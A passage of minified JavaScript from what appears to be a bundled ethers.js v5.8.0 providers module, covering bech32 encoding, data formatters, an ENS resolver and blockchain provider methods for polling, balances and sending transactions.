I=x>>(5-T)*5&31;S+=r.charAt(I)}return S}function a(g,w){if(w=w||90,g.length<8)return g+" too short";if(g.length>w)return"Exceeds length limit";var m=g.toLowerCase(),x=g.toUpperCase();if(g!==m&&g!==x)return"Mixed-case string "+g;g=m;var S=g.lastIndexOf("1");if(S===-1)return"No separator character for "+g;if(S===0)return"Missing prefix for "+g;var T=g.slice(0,S),k=g.slice(S+1);if(k.length<6)return"Data too short";var I=s(T);if(typeof I=="string")return I;for(var E=[],C=0;C<k.length;++C){var N=k.charAt(C),L=e[N];if(L===void 0)return"Unknown character "+N;I=n(I)^L,!(C+6>=k.length)&&E.push(L)}return I!==1?"Invalid checksum for "+g:{prefix:T,words:E}}function c(){var g=a.apply(null,arguments);if(typeof g=="object")return g}function l(g){var w=a.apply(null,arguments);if(typeof w=="object")return w;throw new Error(w)}function u(g,w,m,x){for(var S=0,T=0,k=(1<<m)-1,I=[],E=0;E<g.length;++E)for(S=S<<w|g[E],T+=w;T>=m;)T-=m,I.push(S>>T&k);if(x)T>0&&I.push(S<<m-T&k);else{if(T>=w)return"Excess padding";if(S<<m-T&k)return"Non-zero padding"}return I}function d(g){var w=u(g,8,5,!0);if(Array.isArray(w))return w}function h(g){var w=u(g,8,5,!0);if(Array.isArray(w))return w;throw new Error(w)}function f(g){var w=u(g,5,8,!1);if(Array.isArray(w))return w}function p(g){var w=u(g,5,8,!1);if(Array.isArray(w))return w;throw new Error(w)}return i_={decodeUnsafe:c,decode:l,encode:o,toWordsUnsafe:d,toWords:h,fromWordsUnsafe:f,fromWords:p},i_}var ude=lde();const WM=Ss(ude),_p="providers/5.8.0",rb=new be(_p);class jt{constructor(){this.formats=this.getDefaultFormats()}getDefaultFormats(){const e={},t=this.address.bind(this),i=this.bigNumber.bind(this),n=this.blockTag.bind(this),s=this.data.bind(this),o=this.hash.bind(this),a=this.hex.bind(this),c=this.number.bind(this),l=this.type.bind(this),u=d=>this.data(d,!0);return e.transaction={hash:o,type:l,accessList:jt.allowNull(this.accessList.bind(this),null),blockHash:jt.allowNull(o,null),blockNumber:jt.allowNull(c,null),transactionIndex:jt.allowNull(c,null),confirmations:jt.allowNull(c,null),from:t,gasPrice:jt.allowNull(i),maxPriorityFeePerGas:jt.allowNull(i),maxFeePerGas:jt.allowNull(i),gasLimit:i,to:jt.allowNull(t,null),value:i,nonce:c,data:s,r:jt.allowNull(this.uint256),s:jt.allowNull(this.uint256),v:jt.allowNull(c),creates:jt.allowNull(t,null),raw:jt.allowNull(s)},e.transactionRequest={from:jt.allowNull(t),nonce:jt.allowNull(c),gasLimit:jt.allowNull(i),gasPrice:jt.allowNull(i),maxPriorityFeePerGas:jt.allowNull(i),maxFeePerGas:jt.allowNull(i),to:jt.allowNull(t),value:jt.allowNull(i),data:jt.allowNull(u),type:jt.allowNull(c),accessList:jt.allowNull(this.accessList.bind(this),null)},e.receiptLog={transactionIndex:c,blockNumber:c,transactionHash:o,address:t,topics:jt.arrayOf(o),data:s,logIndex:c,blockHash:o},e.receipt={to:jt.allowNull(this.address,null),from:jt.allowNull(this.address,null),contractAddress:jt.allowNull(t,null),transactionIndex:c,root:jt.allowNull(a),gasUsed:i,logsBloom:jt.allowNull(s),blockHash:o,transactionHash:o,logs:jt.arrayOf(this.receiptLog.bind(this)),blockNumber:c,confirmations:jt.allowNull(c,null),cumulativeGasUsed:i,effectiveGasPrice:jt.allowNull(i),status:jt.allowNull(c),type:l},e.block={hash:jt.allowNull(o),parentHash:o,number:c,timestamp:c,nonce:jt.allowNull(a),difficulty:this.difficulty.bind(this),gasLimit:i,gasUsed:i,miner:jt.allowNull(t),extraData:s,transactions:jt.allowNull(jt.arrayOf(o)),baseFeePerGas:jt.allowNull(i)},e.blockWithTransactions=ds(e.block),e.blockWithTransactions.transactions=jt.allowNull(jt.arrayOf(this.transactionResponse.bind(this))),e.filter={fromBlock:jt.allowNull(n,void 0),toBlock:jt.allowNull(n,void 0),blockHash:jt.allowNull(o,void 0),address:jt.allowNull(t,void 0),topics:jt.allowNull(this.topics.bind(this),void 0)},e.filterLog={blockNumber:jt.allowNull(c),blockHash:jt.allowNull(o),transactionIndex:c,removed:jt.allowNull(this.boolean.bind(this)),address:t,data:jt.allowFalsish(s,"0x"),topics:jt.arrayOf(o),transactionHash:o,logIndex:c},e}accessList(e){return Zg(e||[])}number(e){return e==="0x"?0:Ge.from(e).toNumber()}type(e){return e==="0x"||e==null?0:Ge.from(e).toNumber()}bigNumber(e){return Ge.from(e)}boolean(e){if(typeof e=="boolean")return e;if(typeof e=="string"){if(e=e.toLowerCase(),e==="true")return!0;if(e==="false")return!1}throw new Error("invalid boolean - "+e)}hex(e,t){return typeof e=="string"&&(!t&&e.substring(0,2)!=="0x"&&(e="0x"+e),Jr(e))?e.toLowerCase():rb.throwArgumentError("invalid hash","value",e)}data(e,t){const i=this.hex(e,t);if(i.length%2!==0)throw new Error("invalid data; odd-length - "+e);return i}address(e){return Oi(e)}callAddress(e){if(!Jr(e,32))return null;const t=Oi(Nn(e,12));return t===wce?null:t}contractAddress(e){return l$(e)}blockTag(e){if(e==null)return"latest";if(e==="earliest")return"0x0";switch(e){case"earliest":return"0x0";case"latest":case"pending":case"safe":case"finalized":return e}if(typeof e=="number"||Jr(e))return Ky(e);throw new Error("invalid blockTag")}hash(e,t){const i=this.hex(e,t);return Ad(i)!==32?rb.throwArgumentError("invalid hash","value",e):i}difficulty(e){if(e==null)return null;const t=Ge.from(e);try{return t.toNumber()}catch{}return null}uint256(e){if(!Jr(e))throw new Error("invalid uint256");return Xi(e,32)}_block(e,t){e.author!=null&&e.miner==null&&(e.miner=e.author);const i=e._difficulty!=null?e._difficulty:e.difficulty,n=jt.check(t,e);return n._difficulty=i==null?null:Ge.from(i),n}block(e){return this._block(e,this.formats.block)}blockWithTransactions(e){return this._block(e,this.formats.blockWithTransactions)}transactionRequest(e){return jt.check(this.formats.transactionRequest,e)}transactionResponse(e){e.gas!=null&&e.gasLimit==null&&(e.gasLimit=e.gas),e.to&&Ge.from(e.to).isZero()&&(e.to="0x0000000000000000000000000000000000000000"),e.input!=null&&e.data==null&&(e.data=e.input),e.to==null&&e.creates==null&&(e.creates=this.contractAddress(e)),(e.type===1||e.type===2)&&e.accessList==null&&(e.accessList=[]);const t=jt.check(this.formats.transaction,e);if(e.chainId!=null){let i=e.chainId;Jr(i)&&(i=Ge.from(i).toNumber()),t.chainId=i}else{let i=e.networkId;i==null&&t.v==null&&(i=e.chainId),Jr(i)&&(i=Ge.from(i).toNumber()),typeof i!="number"&&t.v!=null&&(i=(t.v-35)/2,i<0&&(i=0),i=parseInt(i)),typeof i!="number"&&(i=0),t.chainId=i}return t.blockHash&&t.blockHash.replace(/0/g,"")==="x"&&(t.blockHash=null),t}transaction(e){return ZZ(e)}receiptLog(e){return jt.check(this.formats.receiptLog,e)}receipt(e){const t=jt.check(this.formats.receipt,e);if(t.root!=null)if(t.root.length<=4){const i=Ge.from(t.root).toNumber();i===0||i===1?(t.status!=null&&t.status!==i&&rb.throwArgumentError("alt-root-status/status mismatch","value",{root:t.root,status:t.status}),t.status=i,delete t.root):rb.throwArgumentError("invalid alt-root-status","value.root",t.root)}else t.root.length!==66&&rb.throwArgumentError("invalid root hash","value.root",t.root);return t.status!=null&&(t.byzantium=!0),t}topics(e){return Array.isArray(e)?e.map(t=>this.topics(t)):e!=null?this.hash(e,!0):null}filter(e){return jt.check(this.formats.filter,e)}filterLog(e){return jt.check(this.formats.filterLog,e)}static check(e,t){const i={};for(const n in e)try{const s=e[n](t[n]);s!==void 0&&(i[n]=s)}catch(s){throw s.checkKey=n,s.checkValue=t[n],s}return i}static allowNull(e,t){return function(i){return i==null?t:e(i)}}static allowFalsish(e,t){return function(i){return i?e(i):t}}static arrayOf(e){return function(t){if(!Array.isArray(t))throw new Error("not an array");const i=[];return t.forEach(function(n){i.push(e(n))}),i}}}let HM=!1;function dde(){HM||(HM=!0,console.log("========= NOTICE ========="),console.log("Request-Rate Exceeded  (this message will not be repeated)"),console.log(""),console.log("The default API keys for each service are provided as a highly-throttled,"),console.log("community resource for low-traffic projects and early prototyping."),console.log(""),console.log("While your application will continue to function, we highly recommended"),console.log("signing up for your own API keys to improve performance, increase your"),console.log("request rate/limit and enable other perks, such as metrics and advanced APIs."),console.log(""),console.log("For more details: https://docs.ethers.io/api-keys/"),console.log("=========================="))}var yr=function(r,e,t,i){function n(s){return s instanceof t?s:new t(function(o){o(s)})}return new(t||(t=Promise))(function(s,o){function a(u){try{l(i.next(u))}catch(d){o(d)}}function c(u){try{l(i.throw(u))}catch(d){o(d)}}function l(u){u.done?s(u.value):n(u.value).then(a,c)}l((i=i.apply(r,e||[])).next())})};const Fr=new be(_p),hde=10;function VM(r){return r==null?"null":(Ad(r)!==32&&Fr.throwArgumentError("invalid topic","topic",r),r.toLowerCase())}function KM(r){for(r=r.slice();r.length>0&&r[r.length-1]==null;)r.pop();return r.map(e=>{if(Array.isArray(e)){const t={};e.forEach(n=>{t[VM(n)]=!0});const i=Object.keys(t);return i.sort(),i.join("|")}else return VM(e)}).join("&")}function fde(r){return r===""?[]:r.split(/&/g).map(e=>{if(e==="")return[];const t=e.split("|").map(i=>i==="null"?null:i);return t.length===1?t[0]:t})}function M2(r){if(typeof r=="string"){if(r=r.toLowerCase(),Ad(r)===32)return"tx:"+r;if(r.indexOf(":")===-1)return r}else{if(Array.isArray(r))return"filter:*:"+KM(r);if(Ple.isForkEvent(r))throw Fr.warn("not implemented"),new Error("not implemented");if(r&&typeof r=="object")return"filter:"+(r.address||"*")+":"+KM(r.topics||[])}throw new Error("invalid event - "+r)}function ib(){return new Date().getTime()}function GM(r){return new Promise(e=>{setTimeout(e,r)})}const pde=["block","network","pending","poll"];let gde=class{constructor(e,t,i){Pe(this,"tag",e),Pe(this,"listener",t),Pe(this,"once",i),this._lastBlockNumber=-2,this._inflight=!1}get event(){switch(this.type){case"tx":return this.hash;case"filter":return this.filter}return this.tag}get type(){return this.tag.split(":")[0]}get hash(){const e=this.tag.split(":");return e[0]!=="tx"?null:e[1]}get filter(){const e=this.tag.split(":");if(e[0]!=="filter")return null;const t=e[1],i=fde(e[2]),n={};return i.length>0&&(n.topics=i),t&&t!=="*"&&(n.address=t),n}pollable(){return this.tag.indexOf(":")>=0||pde.indexOf(this.tag)>=0}};const mde={0:{symbol:"btc",p2pkh:0,p2sh:5,prefix:"bc"},2:{symbol:"ltc",p2pkh:48,p2sh:50,prefix:"ltc"},3:{symbol:"doge",p2pkh:30,p2sh:22},60:{symbol:"eth",ilk:"eth"},61:{symbol:"etc",ilk:"eth"},700:{symbol:"xdai",ilk:"eth"}};function n_(r){return Xi(Ge.from(r).toHexString(),32)}function ZM(r){return pw.encode(cn([r,Nn(a0(a0(r)),0,4)]))}const fY=new RegExp("^(ipfs)://(.*)$","i"),YM=[new RegExp("^(https)://(.*)$","i"),new RegExp("^(data):(.*)$","i"),fY,new RegExp("^eip155:[0-9]+/(erc[0-9]+):(.*)$","i")];function G8(r,e){try{return Cp(cv(r,e))}catch{}return null}function cv(r,e){if(r==="0x")return null;const t=Ge.from(Nn(r,e,e+32)).toNumber(),i=Ge.from(Nn(r,t,t+32)).toNumber();return Nn(r,t+32,t+32+i)}function s_(r){return r.match(/^ipfs:\/\/ipfs\//i)?r=r.substring(12):r.match(/^ipfs:\/\//i)?r=r.substring(7):Fr.throwArgumentError("unsupported IPFS format","link",r),`https://gateway.ipfs.io/ipfs/${r}`}function JM(r){const e=ze(r);if(e.length>32)throw new Error("internal; should not happen");const t=new Uint8Array(32);return t.set(e,32-e.length),t}function wde(r){if(r.length%32===0)return r;const e=new Uint8Array(Math.ceil(r.length/32)*32);return e.set(r),e}function pY(r){const e=[];let t=0;for(let i=0;i<r.length;i++)e.push(null),t+=32;for(let i=0;i<r.length;i++){const n=ze(r[i]);e[i]=JM(t),e.push(JM(n.length)),e.push(wde(n)),t+=32+Math.ceil(n.length/32)*32}return Wo(e)}class QM{constructor(e,t,i,n){Pe(this,"provider",e),Pe(this,"name",i),Pe(this,"address",e.formatter.address(t)),Pe(this,"_resolvedAddress",n)}supportsWildcard(){return this._supportsEip2544||(this._supportsEip2544=this.provider.call({to:this.address,data:"0x01ffc9a79061b92300000000000000000000000000000000000000000000000000000000"}).then(e=>Ge.from(e).eq(1)).catch(e=>{if(e.code===be.errors.CALL_EXCEPTION)return!1;throw this._supportsEip2544=null,e})),this._supportsEip2544}_fetch(e,t){return yr(this,void 0,void 0,function*(){const i={to:this.address,ccipReadEnabled:!0,data:Wo([e,b5(this.name),t||"0x"])};let n=!1;(yield this.supportsWildcard())&&(n=!0,i.data=Wo(["0x9061b923",pY([RZ(this.name),i.data])]));try{let s=yield this.provider.call(i);return ze(s).length%32===4&&Fr.throwError("resolver threw error",be.errors.CALL_EXCEPTION,{transaction:i,data:s}),n&&(s=cv(s,0)),s}catch(s){if(s.code===be.errors.CALL_EXCEPTION)return null;throw s}})}_fetchBytes(e,t){return yr(this,void 0,void 0,function*(){const i=yield this._fetch(e,t);return i!=null?cv(i,0):null})}_getAddress(e,t){const i=mde[String(e)];if(i==null&&Fr.throwError(`unsupported coin type: ${e}`,be.errors.UNSUPPORTED_OPERATION,{operation:`getAddress(${e})`}),i.ilk==="eth")return this.provider.formatter.address(t);const n=ze(t);if(i.p2pkh!=null){const s=t.match(/^0x76a9([0-9a-f][0-9a-f])([0-9a-f]*)88ac$/);if(s){const o=parseInt(s[1],16);if(s[2].length===o*2&&o>=1&&o<=75)return ZM(cn([[i.p2pkh],"0x"+s[2]]))}}if(i.p2sh!=null){const s=t.match(/^0xa9([0-9a-f][0-9a-f])([0-9a-f]*)87$/);if(s){const o=parseInt(s[1],16);if(s[2].length===o*2&&o>=1&&o<=75)return ZM(cn([[i.p2sh],"0x"+s[2]]))}}if(i.prefix!=null){const s=n[1];let o=n[0];if(o===0?s!==20&&s!==32&&(o=-1):o=-1,o>=0&&n.length===2+s&&s>=1&&s<=75){const a=WM.toWords(n.slice(2));return a.unshift(o),WM.encode(i.prefix,a)}}return null}getAddress(e){return yr(this,void 0,void 0,function*(){if(e==null&&(e=60),e===60)try{const n=yield this._fetch("0x3b3b57de");return n==="0x"||n===yZ?null:this.provider.formatter.callAddress(n)}catch(n){if(n.code===be.errors.CALL_EXCEPTION)return null;throw n}const t=yield this._fetchBytes("0xf1cb7e06",n_(e));if(t==null||t==="0x")return null;const i=this._getAddress(e,t);return i==null&&Fr.throwError("invalid or unsupported coin data",be.errors.UNSUPPORTED_OPERATION,{operation:`getAddress(${e})`,coinType:e,data:t}),i})}getAvatar(){return yr(this,void 0,void 0,function*(){const e=[{type:"name",content:this.name}];try{const t=yield this.getText("avatar");if(t==null)return null;for(let i=0;i<YM.length;i++){const n=t.match(YM[i]);if(n==null)continue;const s=n[1].toLowerCase();switch(s){case"https":return e.push({type:"url",content:t}),{linkage:e,url:t};case"data":return e.push({type:"data",content:t}),{linkage:e,url:t};case"ipfs":return e.push({type:"ipfs",content:t}),{linkage:e,url:s_(t)};case"erc721":case"erc1155":{const o=s==="erc721"?"0xc87b56dd":"0x0e89341c";e.push({type:s,content:t});const a=this._resolvedAddress||(yield this.getAddress()),c=(n[2]||"").split("/");if(c.length!==2)return null;const l=yield this.provider.formatter.address(c[0]),u=Xi(Ge.from(c[1]).toHexString(),32);if(s==="erc721"){const g=this.provider.formatter.callAddress(yield this.provider.call({to:l,data:Wo(["0x6352211e",u])}));if(a!==g)return null;e.push({type:"owner",content:g})}else if(s==="erc1155"){const g=Ge.from(yield this.provider.call({to:l,data:Wo(["0x00fdd58e",Xi(a,32),u])}));if(g.isZero())return null;e.push({type:"balance",content:g.toString()})}const d={to:this.provider.formatter.address(c[0]),data:Wo([o,u])};let h=G8(yield this.provider.call(d),0);if(h==null)return null;e.push({type:"metadata-url-base",content:h}),s==="erc1155"&&(h=h.replace("{id}",u.substring(2)),e.push({type:"metadata-url-expanded",content:h})),h.match(/^ipfs:/i)&&(h=s_(h)),e.push({type:"metadata-url",content:h});const f=yield qx(h);if(!f)return null;e.push({type:"metadata",content:JSON.stringify(f)});let p=f.image;if(typeof p!="string")return null;if(!p.match(/^(https:\/\/|data:)/i)){if(p.match(fY)==null)return null;e.push({type:"url-ipfs",content:p}),p=s_(p)}return e.push({type:"url",content:p}),{linkage:e,url:p}}}}}catch{}return null})}getContentHash(){return yr(this,void 0,void 0,function*(){const e=yield this._fetchBytes("0xbc1c58d1");if(e==null||e==="0x")return null;const t=e.match(/^0xe3010170(([0-9a-f][0-9a-f])([0-9a-f][0-9a-f])([0-9a-f]*))$/);if(t){const o=parseInt(t[3],16);if(t[4].length===o*2)return"ipfs://"+pw.encode("0x"+t[1])}const i=e.match(/^0xe5010172(([0-9a-f][0-9a-f])([0-9a-f][0-9a-f])([0-9a-f]*))$/);if(i){const o=parseInt(i[3],16);if(i[4].length===o*2)return"ipns://"+pw.encode("0x"+i[1])}const n=e.match(/^0xe40101fa011b20([0-9a-f]*)$/);if(n&&n[1].length===64)return"bzz://"+n[1];const s=e.match(/^0x90b2c605([0-9a-f]*)$/);if(s&&s[1].length===68){const o={"=":"","+":"-","/":"_"};return"sia://"+p$("0x"+s[1]).replace(/[=+\/]/g,c=>o[c])}return Fr.throwError("invalid or unsupported content hash data",be.errors.UNSUPPORTED_OPERATION,{operation:"getContentHash()",data:e})})}getText(e){return yr(this,void 0,void 0,function*(){let t=Fn(e);t=cn([n_(64),n_(t.length),t]),t.length%32!==0&&(t=cn([t,Xi("0x",32-e.length%32)]));const i=yield this._fetchBytes("0x59d1d43c",Qe(t));return i==null||i==="0x"?null:Cp(i)})}}let o_=null,bde=1;class vde extends Zy{constructor(e){if(super(),this._events=[],this._emitted={block:-2},this.disableCcipRead=!1,this.formatter=new.target.getFormatter(),Pe(this,"anyNetwork",e==="any"),this.anyNetwork&&(e=this.detectNetwork()),e instanceof Promise)this._networkPromise=e,e.catch(t=>{}),this._ready().catch(t=>{});else{const t=Ta(new.target,"getNetwork")(e);t?(Pe(this,"_network",t),this.emit("network",t,null)):Fr.throwArgumentError("invalid network","network",e)}this._maxInternalBlockNumber=-1024,this._lastBlockNumber=-2,this._maxFilterBlockRange=10,this._pollingInterval=4e3,this._fastQueryDate=0}_ready(){return yr(this,void 0,void 0,function*(){if(this._network==null){let e=null;if(this._networkPromise)try{e=yield this._networkPromise}catch{}e==null&&(e=yield this.detectNetwork()),e||Fr.throwError("no network detected",be.errors.UNKNOWN_ERROR,{}),this._network==null&&(this.anyNetwork?this._network=e:Pe(this,"_network",e),this.emit("network",e,null))}return this._network})}get ready(){return Hm(()=>this._ready().then(e=>e,e=>{if(!(e.code===be.errors.NETWORK_ERROR&&e.event==="noNetwork"))throw e}))}static getFormatter(){return o_==null&&(o_=new jt),o_}static getNetwork(e){return rde(e??"homestead")}ccipReadFetch(e,t,i){return yr(this,void 0,void 0,function*(){if(this.disableCcipRead||i.length===0)return null;const n=e.to.toLowerCase(),s=t.toLowerCase(),o=[];for(let a=0;a<i.length;a++){const c=i[a],l=c.replace("{sender}",n).replace("{data}",s),u=c.indexOf("{data}")>=0?null:JSON.stringify({data:s,sender:n}),d=yield qx({url:l,errorPassThrough:!0},u,(f,p)=>(f.status=p.statusCode,f));if(d.data)return d.data;const h=d.message||"unknown error";if(d.status>=400&&d.status<500)return Fr.throwError(`response not found during CCIP fetch: ${h}`,be.errors.SERVER_ERROR,{url:c,errorMessage:h});o.push(h)}return Fr.throwError(`error encountered during CCIP fetch: ${o.map(a=>JSON.stringify(a)).join(", ")}`,be.errors.SERVER_ERROR,{urls:i,errorMessages:o})})}_getInternalBlockNumber(e){return yr(this,void 0,void 0,function*(){if(yield this._ready(),e>0)for(;this._internalBlockNumber;){const n=this._internalBlockNumber;try{const s=yield n;if(ib()-s.respTime<=e)return s.blockNumber;break}catch{if(this._internalBlockNumber===n)break}}const t=ib(),i=Un({blockNumber:this.perform("getBlockNumber",{}),networkError:this.getNetwork().then(n=>null,n=>n)}).then(({blockNumber:n,networkError:s})=>{if(s)throw this._internalBlockNumber===i&&(this._internalBlockNumber=null),s;const o=ib();return n=Ge.from(n).toNumber(),n<this._maxInternalBlockNumber&&(n=this._maxInternalBlockNumber),this._maxInternalBlockNumber=n,this._setFastBlockNumber(n),{blockNumber:n,reqTime:t,respTime:o}});return this._internalBlockNumber=i,i.catch(n=>{this._internalBlockNumber===i&&(this._internalBlockNumber=null)}),(yield i).blockNumber})}poll(){return yr(this,void 0,void 0,function*(){const e=bde++,t=[];let i=null;try{i=yield this._getInternalBlockNumber(100+this.pollingInterval/2)}catch(n){this.emit("error",n);return}if(this._setFastBlockNumber(i),this.emit("poll",e,i),i===this._lastBlockNumber){this.emit("didPoll",e);return}if(this._emitted.block===-2&&(this._emitted.block=i-1),Math.abs(this._emitted.block-i)>1e3)Fr.warn(`network block skew detected; skipping block events (emitted=${this._emitted.block} blockNumber${i})`),this.emit("error",Fr.makeError("network block skew detected",be.errors.NETWORK_ERROR,{blockNumber:i,event:"blockSkew",previousBlockNumber:this._emitted.block})),this.emit("block",i);else for(let n=this._emitted.block+1;n<=i;n++)this.emit("block",n);this._emitted.block!==i&&(this._emitted.block=i,Object.keys(this._emitted).forEach(n=>{if(n==="block")return;const s=this._emitted[n];s!=="pending"&&i-s>12&&delete this._emitted[n]})),this._lastBlockNumber===-2&&(this._lastBlockNumber=i-1),this._events.forEach(n=>{switch(n.type){case"tx":{const s=n.hash;let o=this.getTransactionReceipt(s).then(a=>(!a||a.blockNumber==null||(this._emitted["t:"+s]=a.blockNumber,this.emit(s,a)),null)).catch(a=>{this.emit("error",a)});t.push(o);break}case"filter":{if(!n._inflight){n._inflight=!0,n._lastBlockNumber===-2&&(n._lastBlockNumber=i-1);const s=n.filter;s.fromBlock=n._lastBlockNumber+1,s.toBlock=i;const o=s.toBlock-this._maxFilterBlockRange;o>s.fromBlock&&(s.fromBlock=o),s.fromBlock<0&&(s.fromBlock=0);const a=this.getLogs(s).then(c=>{n._inflight=!1,c.length!==0&&c.forEach(l=>{l.blockNumber>n._lastBlockNumber&&(n._lastBlockNumber=l.blockNumber),this._emitted["b:"+l.blockHash]=l.blockNumber,this._emitted["t:"+l.transactionHash]=l.blockNumber,this.emit(s,l)})}).catch(c=>{this.emit("error",c),n._inflight=!1});t.push(a)}break}}}),this._lastBlockNumber=i,Promise.all(t).then(()=>{this.emit("didPoll",e)}).catch(n=>{this.emit("error",n)})})}resetEventsBlock(e){this._lastBlockNumber=e-1,this.polling&&this.poll()}get network(){return this._network}detectNetwork(){return yr(this,void 0,void 0,function*(){return Fr.throwError("provider does not support network detection",be.errors.UNSUPPORTED_OPERATION,{operation:"provider.detectNetwork"})})}getNetwork(){return yr(this,void 0,void 0,function*(){const e=yield this._ready(),t=yield this.detectNetwork();if(e.chainId!==t.chainId){if(this.anyNetwork)return this._network=t,this._lastBlockNumber=-2,this._fastBlockNumber=null,this._fastBlockNumberPromise=null,this._fastQueryDate=0,this._emitted.block=-2,this._maxInternalBlockNumber=-1024,this._internalBlockNumber=null,this.emit("network",t,e),yield GM(0),this._network;const i=Fr.makeError("underlying network changed",be.errors.NETWORK_ERROR,{event:"changed",network:e,detectedNetwork:t});throw this.emit("error",i),i}return e})}get blockNumber(){return this._getInternalBlockNumber(100+this.pollingInterval/2).then(e=>{this._setFastBlockNumber(e)},e=>{}),this._fastBlockNumber!=null?this._fastBlockNumber:-1}get polling(){return this._poller!=null}set polling(e){e&&!this._poller?(this._poller=setInterval(()=>{this.poll()},this.pollingInterval),this._bootstrapPoll||(this._bootstrapPoll=setTimeout(()=>{this.poll(),this._bootstrapPoll=setTimeout(()=>{this._poller||this.poll(),this._bootstrapPoll=null},this.pollingInterval)},0))):!e&&this._poller&&(clearInterval(this._poller),this._poller=null)}get pollingInterval(){return this._pollingInterval}set pollingInterval(e){if(typeof e!="number"||e<=0||parseInt(String(e))!=e)throw new Error("invalid polling interval");this._pollingInterval=e,this._poller&&(clearInterval(this._poller),this._poller=setInterval(()=>{this.poll()},this._pollingInterval))}_getFastBlockNumber(){const e=ib();return e-this._fastQueryDate>2*this._pollingInterval&&(this._fastQueryDate=e,this._fastBlockNumberPromise=this.getBlockNumber().then(t=>((this._fastBlockNumber==null||t>this._fastBlockNumber)&&(this._fastBlockNumber=t),this._fastBlockNumber))),this._fastBlockNumberPromise}_setFastBlockNumber(e){this._fastBlockNumber!=null&&e<this._fastBlockNumber||(this._fastQueryDate=ib(),(this._fastBlockNumber==null||e>this._fastBlockNumber)&&(this._fastBlockNumber=e,this._fastBlockNumberPromise=Promise.resolve(e)))}waitForTransaction(e,t,i){return yr(this,void 0,void 0,function*(){return this._waitForTransaction(e,t??1,i||0,null)})}_waitForTransaction(e,t,i,n){return yr(this,void 0,void 0,function*(){const s=yield this.getTransactionReceipt(e);return(s?s.confirmations:0)>=t?s:new Promise((o,a)=>{const c=[];let l=!1;const u=function(){return l?!0:(l=!0,c.forEach(h=>{h()}),!1)},d=h=>{h.confirmations<t||u()||o(h)};if(this.on(e,d),c.push(()=>{this.removeListener(e,d)}),n){let h=n.startBlock,f=null;const p=g=>yr(this,void 0,void 0,function*(){l||(yield GM(1e3),this.getTransactionCount(n.from).then(w=>yr(this,void 0,void 0,function*(){if(!l){if(w<=n.nonce)h=g;else{{const m=yield this.getTransaction(e);if(m&&m.blockNumber!=null)return}for(f==null&&(f=h-3,f<n.startBlock&&(f=n.startBlock));f<=g;){if(l)return;const m=yield this.getBlockWithTransactions(f);for(let x=0;x<m.transactions.length;x++){const S=m.transactions[x];if(S.hash===e)return;if(S.from===n.from&&S.nonce===n.nonce){if(l)return;const T=yield this.waitForTransaction(S.hash,t);if(u())return;let k="replaced";S.data===n.data&&S.to===n.to&&S.value.eq(n.value)?k="repriced":S.data==="0x"&&S.from===S.to&&S.value.isZero()&&(k="cancelled"),a(Fr.makeError("transaction was replaced",be.errors.TRANSACTION_REPLACED,{cancelled:k==="replaced"||k==="cancelled",reason:k,replacement:this._wrapTransaction(S),hash:e,receipt:T}));return}}f++}}l||this.once("block",p)}}),w=>{l||this.once("block",p)}))});if(l)return;this.once("block",p),c.push(()=>{this.removeListener("block",p)})}if(typeof i=="number"&&i>0){const h=setTimeout(()=>{u()||a(Fr.makeError("timeout exceeded",be.errors.TIMEOUT,{timeout:i}))},i);h.unref&&h.unref(),c.push(()=>{clearTimeout(h)})}})})}getBlockNumber(){return yr(this,void 0,void 0,function*(){return this._getInternalBlockNumber(0)})}getGasPrice(){return yr(this,void 0,void 0,function*(){yield this.getNetwork();const e=yield this.perform("getGasPrice",{});try{return Ge.from(e)}catch(t){return Fr.throwError("bad result from backend",be.errors.SERVER_ERROR,{method:"getGasPrice",result:e,error:t})}})}getBalance(e,t){return yr(this,void 0,void 0,function*(){yield this.getNetwork();const i=yield Un({address:this._getAddress(e),blockTag:this._getBlockTag(t)}),n=yield this.perform("getBalance",i);try{return Ge.from(n)}catch(s){return Fr.throwError("bad result from backend",be.errors.SERVER_ERROR,{method:"getBalance",params:i,result:n,error:s})}})}getTransactionCount(e,t){return yr(this,void 0,void 0,function*(){yield this.getNetwork();const i=yield Un({address:this._getAddress(e),blockTag:this._getBlockTag(t)}),n=yield this.perform("getTransactionCount",i);try{return Ge.from(n).toNumber()}catch(s){return Fr.throwError("bad result from backend",be.errors.SERVER_ERROR,{method:"getTransactionCount",params:i,result:n,error:s})}})}getCode(e,t){return yr(this,void 0,void 0,function*(){yield this.getNetwork();const i=yield Un({address:this._getAddress(e),blockTag:this._getBlockTag(t)}),n=yield this.perform("getCode",i);try{return Qe(n)}catch(s){return Fr.throwError("bad result from backend",be.errors.SERVER_ERROR,{method:"getCode",params:i,result:n,error:s})}})}getStorageAt(e,t,i){return yr(this,void 0,void 0,function*(){yield this.getNetwork();const n=yield Un({address:this._getAddress(e),blockTag:this._getBlockTag(i),position:Promise.resolve(t).then(o=>Ky(o))}),s=yield this.perform("getStorageAt",n);try{return Qe(s)}catch(o){return Fr.throwError("bad result from backend",be.errors.SERVER_ERROR,{method:"getStorageAt",params:n,result:s,error:o})}})}_wrapTransaction(e,t,i){if(t!=null&&Ad(t)!==32)throw new Error("invalid response - sendTransaction");const n=e;return t!=null&&e.hash!==t&&Fr.throwError("Transaction hash mismatch from Provider.sendTransaction.",be.errors.UNKNOWN_ERROR,{expectedHash:e.hash,returnedHash:t}),n.wait=(s,o)=>yr(this,void 0,void 0,function*(){s==null&&(s=1),o==null&&(o=0);let a;s!==0&&i!=null&&(a={data:e.data,from:e.from,nonce:e.nonce,to:e.to,value:e.value,startBlock:i});const c=yield this._waitForTransaction(e.hash,s,o,a);return c==null&&s===0?null:(this._emitted["t:"+e.hash]=c.blockNumber,c.status===0&&Fr.throwError("transaction failed",be.errors.CALL_EXCEPTION,{transactionHash:e.hash,transaction:e,receipt:c}),c)}),n}sendTransaction(e){return yr(this,void 0,void 0,function*(){yield this.getNetwork();const t=yield Promise.resolve(e).then(s=>Qe(s)),i=this.formatter.transaction(e);i.confirmations==null&&(i.confirmations=0);const n=yield this._getInternalBlockNumber(100+2*this.pollingInterval);try{const s=yield this.perform("sendTransaction",{signedTransaction:t});return this._wrapTransaction(i,s,n)}catch(s){throw s.transaction=i,s.transactionHash=i.hash,s}})}_getTransactionRequest(e){return yr(this,void 0,void 0,function*(){const t=yield 